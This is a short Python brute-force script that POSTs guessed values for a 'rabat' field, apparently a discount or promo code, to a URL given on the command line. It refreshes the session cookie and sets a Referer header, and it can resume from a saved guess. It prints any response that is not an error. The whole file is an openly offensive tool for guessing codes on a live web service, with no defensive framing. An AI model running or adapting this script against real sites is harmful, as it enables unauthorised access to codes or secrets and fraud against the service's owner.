from requests import Session
import sys
import itertools
import json
import time


if len(sys.argv) < 2:
	print("Incorrect nr of args")
	exit()

url = sys.argv[1]
referer = sys.argv[2]

def makeRequest(url,referer):

	response = session.post(
		url,
		data={
			'rabat': s
		},
		headers={
			'Referer': referer
		}
	)
	print("Password: %s" % s)

	res = json.loads(response.text)
	print(res)

	if( res["status"] != "error"):
		print("----------------------")
		print(res["status"])
		print("----------------------")


	time.sleep(0.1)

session = Session()

characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ" #"abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

pause_point = "0123DT"
start_len = len(pause_point)
after_pause_point = False

for i in range(start_len, 50):

	print("Bruteforce lenght: %d" %  i)
	gen = itertools.permutations(characters,i)
	for s in gen:
		s = ''.join(s)
		if (not after_pause_point and s == pause_point):
			after_pause_point = True
		
		if (after_pause_point):
	
			# HEAD requests ask for just the headers, 
			# which is all you need to grab the
			# session cookie
			session.head(referer)
			makeRequest(url,referer)
